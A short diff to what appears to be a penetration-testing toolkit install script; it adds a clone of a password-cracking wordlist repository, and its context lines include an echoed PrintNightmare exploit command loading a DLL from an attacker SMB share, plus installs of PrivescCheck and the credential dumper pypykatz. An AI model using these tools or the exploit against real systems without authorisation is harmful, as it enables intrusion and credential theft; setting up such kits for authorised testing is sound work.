@@ -813,6 +813,10 @@ echo "python3 CVE-2021-1675.py domain.local/user:pass@ip '\\your_ip\smb\your_dll
 cd $INTERNALS_DIR
 git clone https://github.com/itm4n/PrivescCheck.git
 
+# Probable-Wordlists
+cd $PASSCRACK_DIR
+git clone https://github.com/berzerk0/Probable-Wordlists.git
+
 # Pypycatz
 pipx install git+https://github.com/skelsec/pypykatz || echo "[-] Failed to install Pypycatz"
 
